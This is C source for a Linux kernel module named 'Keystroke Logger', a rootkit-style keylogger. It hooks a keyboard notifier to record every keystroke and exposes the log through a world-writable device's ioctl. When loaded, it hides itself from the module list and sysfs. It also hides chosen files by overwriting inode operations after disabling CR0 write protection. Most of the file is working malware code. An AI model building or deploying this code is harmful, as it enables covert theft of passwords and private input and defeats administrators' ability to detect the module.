#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/semaphore.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/current.h>
#include <asm/set_memory.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>

#include "kl.h"

/* module hiding objects */
/* backup module information when hide module */
static struct list_head *mod_list;
static struct modinfo mod_info;
static int mod_hidden = 0;

/* backup file information */
static struct fileinfo *file_info;
static unsigned long *file_ino;
static int file_hide_count = 0;

/* for finding path */
struct path root_nd;
struct dentry *parent_dentry;

/* filldir function pointer */
typedef bool (*filldir_t)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
filldir_t real_filldir;

/* keylog objects */
/**
 * keymap 
 * from https://github.com/jarun/spy/blob/master/spy.c 
 */
static const char *keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
	{"_PAUSE_", "_PAUSE_"},                                         // 119
};

static int keylog_on;
static int kl_client_pid;

static char *log_buf;
static int log_buf_offset;

void alloc_log_buf(void) {
  log_buf = (char *)kmalloc(MAX_BUF_LEN, GFP_KERNEL);
  memset(log_buf, 0x0, MAX_BUF_LEN);
  log_buf_offset = 0;
}
void free_log_buf(void) {
  kfree(log_buf);
}

static char __user *user_log_buf = NULL;
static size_t user_log_buf_size = 0;

// dynamically allocate file information list
void alloc_file_info(void) {
  file_info = (struct fileinfo *)kmalloc(sizeof(struct fileinfo), GFP_KERNEL);
  file_ino = (unsigned long *)kmalloc(sizeof(unsigned long), GFP_KERNEL);
}
void realloc_file_info(void) {
  file_info = (struct fileinfo *)krealloc(file_info, sizeof(struct fileinfo) * (file_hide_count + 1), GFP_KERNEL);
  file_ino = (unsigned long *)krealloc(file_ino, sizeof(unsigned long) * (file_hide_count + 1), GFP_KERNEL);
}

/* for x86 architecture (cr3 register page protection bit masking) */
#ifdef __x86_64__
void disable_page_protection(void) {
  write_cr0(read_cr0() & (~0x10000));
}
void enable_page_protection(void) {
  write_cr0(read_cr0() | 0x10000);
}
#endif


/* --------------------------------------------------------------------------- */
/* Functions related to hide-file operation */
// new parent file operation
bool new_filldir(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
  unsigned int i;
  struct dentry *p_dentry;
  struct qstr current_name;
  
  if (!parent_dentry) {
    return real_filldir(ctx, name, namelen, offset, ino, d_type);
  }
  
  current_name.name = name;
  current_name.len = namelen;
  current_name.hash = full_name_hash(parent_dentry, name, namelen);

  p_dentry = d_lookup(parent_dentry, &current_name);
  
  if (p_dentry) {
    for (i = 0; i < file_hide_count; i++) {
      if (file_ino[i] == p_dentry->d_inode->i_ino) {
          dput(p_dentry);
          return 0;
      }
    }
    dput(p_dentry);
  }

  return real_filldir(ctx, name, namelen, offset, ino, d_type);
}

int new_parent_iterate(struct file *file, struct dir_context *ctx)
{
  parent_dentry = file->f_path.dentry;
  {
      filldir_t original_filldir = ctx->actor;
      real_filldir = original_filldir;
  }
  ctx->actor = new_filldir;
  
  if (root_nd.dentry && root_nd.dentry->d_inode &&
      root_nd.dentry->d_inode->i_fop &&
      root_nd.dentry->d_inode->i_fop->iterate_shared) {
    return  root_nd.dentry->d_inode->i_fop->iterate_shared(file, ctx);
  }
  
  return 0;
}

static struct file_operations new_parent_fop = {
  .owner          = THIS_MODULE,
  .iterate_shared = new_parent_iterate,
};

// new target inode operation
int new_getattr(struct mnt_idmap *idmap, const struct path *path, struct kstat *stat, u32 request_mask, unsigned int query_flags)
{
  printk(KERN_ALERT "[Keystroke Logger] Entered in new_getattr\n");
  return -ENOENT;
}

int new_rmdir(struct inode *inode, struct dentry *dentry)
{
  printk(KERN_ALERT "[Keystroke Logger] Entered in new_rmdir\n");
  return -ENOENT;
}

static struct inode_operations new_iop = {
  .getattr = new_getattr,
  .rmdir   = new_rmdir,
};

// new target file operation
int new_iterate(struct file *file, struct dir_context *ctx)
{
    printk(KERN_ALERT "[Keystroke Logger] Entered in new_iterate\n");
    return -ENOENT;
}

int new_open(struct inode *inode, struct file *file)
{
    printk(KERN_ALERT "[Keystroke Logger] Entered in new_open\n");
    return -ENOENT;
}

int new_release(struct inode *inode, struct file *file)
{
    printk(KERN_ALERT "[Keystroke Logger] Entered in new_release\n");
    return -ENOENT;
}

ssize_t new_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
    printk(KERN_ALERT "[Keystroke Logger] Entered in new_read\n");
    return -ENOENT;
}

ssize_t new_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos)
{
    printk(KERN_ALERT "[Keystroke Logger] Entered in new_write\n");
    return -ENOENT;
}

int new_mmap(struct file *file, struct vm_area_struct *vma)
{
    printk(KERN_ALERT "[Keystroke Logger] Entered in new_mmap\n");
    return -ENOENT;
}

static struct file_operations new_fop = {
    .owner          = THIS_MODULE,
    .iterate_shared = new_iterate,
    .open           = new_open,
    .release        = new_release,
    .read           = new_read, 
    .write          = new_write,
    .mmap           = new_mmap,
};

void kl_hide_file(const char *file_path) {
  int error = 0;
  struct path nd;

  error = kern_path("/root", LOOKUP_FOLLOW, &root_nd);
  if (error) {
    printk(KERN_ALERT "[Keystroke Logger] Can't access /root, error = %d\n", error);
    return;
  }

  error = kern_path(file_path, LOOKUP_FOLLOW, &nd);
  if (error) {
    printk(KERN_ALERT "[Keystroke Logger] Can't access file: %s, error = %d\n", file_path, error);
    return;
  }
  
  if (!nd.dentry || !nd.dentry->d_inode) {
    printk(KERN_ALERT "[Keystroke Logger] Invalid dentry or inode for file: %s\n", file_path);
    path_put(&nd);
    return;
  }

  if(file_hide_count == 0) {
    alloc_file_info();
  } 
  if(file_ino == NULL) {
    printk(KERN_ALERT "[Keystroke Logger] Error allocating memory\n");
    path_put(&nd);
    return;
  }

  file_info[file_hide_count].old_fop_pointer = nd.dentry->d_inode->i_fop;
  file_info[file_hide_count].old_iop_pointer = nd.dentry->d_inode->i_op;
  file_info[file_hide_count].old_parent_fop_pointer = nd.dentry->d_parent->d_inode->i_fop;
  file_info[file_hide_count].old_parent_iop_pointer = nd.dentry->d_parent->d_inode->i_op;
  file_info[file_hide_count].file_path = file_path;
  file_info[file_hide_count].released = 0;
  file_ino[file_hide_count] = nd.dentry->d_inode->i_ino;
  file_hide_count++;

  realloc_file_info();
  
  disable_page_protection();

  nd.dentry->d_parent->d_inode->i_fop = &new_parent_fop;
  nd.dentry->d_inode->i_op = &new_iop;
  nd.dentry->d_inode->i_fop = &new_fop;

  path_put(&nd);

  enable_page_protection();

  return;
} 

void kl_unhide_file(const char *file_path) {
  int i, found = 0;
  int error;
  struct inode *p_inode;
  struct inode *p_parent_inode;
  struct path nd;
  ino_t target_ino;

  error = kern_path(file_path, LOOKUP_FOLLOW, &nd);

  if (error) {
    printk(KERN_ALERT "[Keystroke Logger] Can't access file %s, error = %d\n", file_path, error);
    return;
  }
  if (!nd.dentry || !nd.dentry->d_inode) {
    printk(KERN_ALERT "[Keystroke Logger] Invalid dentry or inode for file %s\n", file_path);
    path_put(&nd);
    return;
  }

  disable_page_protection();
 
  target_ino = nd.dentry->d_inode->i_ino;
  
  for(i = 0; i < file_hide_count; i++) {
    if(file_ino[i] == target_ino && !file_info[i].released) {
      nd.dentry->d_inode->i_op = file_info[i].old_iop_pointer;
      nd.dentry->d_inode->i_fop = file_info[i].old_fop_pointer;
      nd.dentry->d_parent->d_inode->i_fop = file_info[i].old_parent_fop_pointer;
      
      file_info[i].released = 1;
      found = 1;
    }
  }

  if(!found) {
    printk(KERN_ALERT "[Keystroke Logger] File %s not found\n", file_path);
  }

  path_put(&nd);

  enable_page_protection();
}

void kl_unhide_files(void) {
  int i;
  struct path nd;
  int error;

  if (!file_info || !file_ino) {
    printk(KERN_ALERT "[Keystroke Logger] No files to unhide\n");
    return;
  }

  for(i = 0; i < file_hide_count; i++) {
    if(file_info[i].released || !file_info[i].file_path) {
      continue;
    }

    error = kern_path(file_info[i].file_path, LOOKUP_FOLLOW, &nd);
    if (error) {
      printk(KERN_ALERT "[Keystroke Logger] Can't access file %s, error = %d\n", file_info[i].file_path, error);
      continue;
    }

    disable_page_protection();
      
    if (nd.dentry && nd.dentry->d_inode) {
      nd.dentry->d_inode->i_op = file_info[i].old_iop_pointer;
      nd.dentry->d_inode->i_fop = file_info[i].old_fop_pointer;
      if (nd.dentry->d_parent && nd.dentry->d_parent->d_inode) {
        nd.dentry->d_parent->d_inode->i_fop = file_info[i].old_parent_fop_pointer;
      }
    }
      
    enable_page_protection();
    path_put(&nd);

    file_info[i].released = 1;
  }

  if (file_info) {
    kfree(file_info);
    file_info = NULL;
  }
  if (file_ino) {
    kfree(file_ino);
    file_ino = NULL;
  }
  
  file_hide_count = 0;
}


/* --------------------------------------------------------------------------- */
/* TODO: hide client process */
void kl_hide_proc(const char* pid) {
}

void kl_unhide_proc(void) {
}


/* --------------------------------------------------------------------------- */
/* Functions related to keylog operation */
size_t keycode_to_string(int keycode, int shift, char *buffer, size_t buff_size)
{
  memset(buffer, 0x0, buff_size);

	if(keycode > KEY_RESERVED && keycode <= KEY_PAUSE) 
	{
		const char *c = (shift == 1) ? keymap[keycode][1] : keymap[keycode][0];
		snprintf(buffer, buff_size, "%s", c);
		return strlen(buffer);
	}
	
	return 0;
}

// void kl_flush_buf(void) {}

int kl_notifier_call(struct notifier_block *kblock, unsigned long action, void *data)
{
  struct keyboard_notifier_param *key_param;
  size_t keystr_len = 0;
  char tmp_buff[TMP_BUF_LEN];
  
  key_param = (struct keyboard_notifier_param *)data;
    
	if(!(key_param->down) || (keystr_len = keycode_to_string(key_param->value, key_param->shift, tmp_buff, TMP_BUF_LEN)) < 1)
	  return NOTIFY_OK;
	
	// if(tmp_buff[0] == '\n')
	// {
  //   log_buf[log_buf_offset++] = '\n';
	//   kl_flush_buf();
	//   return NOTIFY_OK;
	// }
	
	// if((log_buf_offset + keystr_len) >= MAX_BUF_LEN - 1)
  //   kl_flush_buf();

	strncpy(log_buf + log_buf_offset, tmp_buff, keystr_len);
	log_buf_offset += keystr_len;
    
  return NOTIFY_OK;
}

static struct notifier_block kl_notifier = {
  .notifier_call = kl_notifier_call
};

void kl_keylog_on(void) {
  keylog_on = 1;  
  memset(log_buf, 0, MAX_BUF_LEN);
}

void kl_keylog_off(void) {
  keylog_on = 0;
}


/* --------------------------------------------------------------------------- */
/* Functions related to hide-mod operation */
void kl_hide_mod(void) {
  if(mod_hidden) {
    return;
  }

  mod_list = THIS_MODULE->list.prev;
  mod_info.sect_attrs = THIS_MODULE->sect_attrs;
  mod_info.notes_attrs = THIS_MODULE->notes_attrs;
  mod_info.holders_dir = THIS_MODULE->holders_dir;

  list_del(&THIS_MODULE->list);
  kobject_del(&THIS_MODULE->mkobj.kobj);
  THIS_MODULE->sect_attrs = NULL;
  THIS_MODULE->notes_attrs = NULL;
  THIS_MODULE->holders_dir = NULL;
  mod_hidden = 1;
}

void kl_unhide_mod(void) {
  if(!mod_hidden) {
    return;
  }

  if (kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "kl")) {
    printk(KERN_ALERT "[Keystroke Logger] Failed to add kobject\n");
    return;
  }

  THIS_MODULE->holders_dir = mod_info.holders_dir;

  THIS_MODULE->sect_attrs = mod_info.sect_attrs;
  THIS_MODULE->notes_attrs = mod_info.notes_attrs;

  list_add(&THIS_MODULE->list, mod_list);
    
  mod_hidden = 0;
}


/* --------------------------------------------------------------------------- */
/* Functions related to ioctl */
int kl_release(struct inode *inode, struct file *filp) { return 0; }

long kl_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
  int ret;
  struct kl_req req;
  char *pid;
  char *file_path;

  ret = copy_from_user(&req, (void *)arg, sizeof(struct kl_req));
  if (ret) {
    pr_err("[Keystroke Logger] Error fetching argument from user");
    return -1;
  }

  printk(KERN_INFO "[Keystroke Logger] ioctl cmd: %d\n", cmd);
  printk(KERN_INFO "[Keystroke Logger] pid: %s\n", req.pid);
  printk(KERN_INFO "[Keystroke Logger] file_path: %s\n", req.file_path);

  switch (cmd) {
  case KL_CMD_HIDE_PROC:
    pid = req.pid;
    kl_hide_proc(pid);
    break;
  case KL_CMD_UNHIDE_PROC:
    kl_unhide_proc();
    break;
  case KL_CMD_HIDE_FILE:
    file_path = req.file_path;
    kl_hide_file(file_path);
    break;
  case KL_CMD_UNHIDE_FILE:
    file_path = req.file_path;
    kl_unhide_file(file_path);
    break;
  case KL_CMD_KEYLOG_ON:
    kl_client_pid = req.cid; 
    kl_keylog_on();
    break;
  case KL_CMD_KEYLOG_OFF:
    kl_keylog_off();
    return kl_client_pid;
  case KL_CMD_HIDE_MOD:
    kl_hide_mod();
    break;
  case KL_CMD_UNHIDE_MOD:
    kl_unhide_mod();
    break;
  case KL_CMD_SET_LOG_BUFFER:
    struct kl_log_req log_req;

    if (copy_from_user(&log_req, (void __user *)arg, sizeof(log_req))) {
      pr_err("[Keystroke Logger] Error copying user log buffer registration data\n");
      return -EFAULT;
    }

    user_log_buf = log_req.buf;
    user_log_buf_size = log_req.len;

    pr_info("[Keystroke Logger] User log buffer registered: %p, size: %zu\n", user_log_buf, user_log_buf_size);
    break;
  case KL_CMD_GET_LOG: {
    size_t bytes_to_copy = log_buf_offset;

    if (!user_log_buf) {
      pr_err("[Keystroke Logger] No user log buffer registered\n");
      return -EFAULT;
    }

    if (bytes_to_copy > user_log_buf_size)
      bytes_to_copy = user_log_buf_size;
    
    if (copy_to_user(user_log_buf, log_buf, bytes_to_copy)) {
      pr_err("[Keystroke Logger] Error copying log buffer to user space\n");
      return -EFAULT;
    }

    log_buf_offset = 0;
    memset(log_buf, 0, MAX_BUF_LEN);
    
    return bytes_to_copy;
  }
  default:
    return -1;
  }
  return 0;
}

struct file_operations kl_fops = {
  .release = kl_release,
  .compat_ioctl = kl_ioctl,
  .unlocked_ioctl = kl_ioctl,
};

struct miscdevice kl_dev = {
  .minor = MISC_DYNAMIC_MINOR,
  .name = "kl",
  .fops = &kl_fops,
  .mode = 0666,
};

static int __init init_kl(void) {
  int ret;

  ret = misc_register(&kl_dev);
  if (ret) {
    pr_err("[Keystroke Logger] Error registering device");
    return -1;
  }
  pr_info("[Keystroke Logger] initialization successful\n");

  // alloc keylog buffer
  alloc_log_buf();
  
  keylog_on = 0;
  register_keyboard_notifier(&kl_notifier);
  
  kl_hide_mod();

  return 0;
}

static void __exit exit_kl(void) {
  pr_info("[Keystroke Logger] exiting\n"); 
  kl_unhide_files();
  unregister_keyboard_notifier(&kl_notifier);
  misc_deregister(&kl_dev); 
  free_log_buf();
}

module_init(init_kl);
module_exit(exit_kl);
MODULE_LICENSE("GPL");
